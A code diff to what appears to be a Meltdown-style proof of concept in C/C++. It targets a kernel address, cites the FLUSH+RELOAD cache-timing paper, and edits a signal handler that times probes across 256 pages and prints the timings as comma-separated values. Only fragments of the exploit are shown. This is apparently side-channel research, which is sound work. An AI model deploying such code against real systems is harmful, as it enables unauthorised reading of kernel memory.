@@ -1,10 +1,12 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <signal.h>
+#include <algorithm>
+#include <iostream>
 
 char* data;
 
-char* addr = reinterpret_cast<char*>(0xffff880000000000);
+char* addr = reinterpret_cast<char*>(0xffff980000000000);
 
 // See https://eprint.iacr.org/2013/448.pdf
 unsigned long probe(char* addr)
@@ -37,7 +39,13 @@ static void handler(int sig, siginfo_t* si, void* unused)
         result[i] = probe(&data[i * 4096]);
 
     for (int i = 0; i < 256; ++i)
-        printf("Index: %d Time: %d\n", i, result[i]);
+        printf("%d,", result[i]);
+    
+    printf(";\n");
+    //printf("Index: %d Time: %d\n", i, result[i]);
+
+    // auto minmax = std::minmax_element(&result[1], &result[256]);
+    // std::cout << "Min: " << *(minmax.first) << " Max: " << *(minmax.second) <<std::endl;
 
     delete[] data;
     data = new char[256 * 4096];
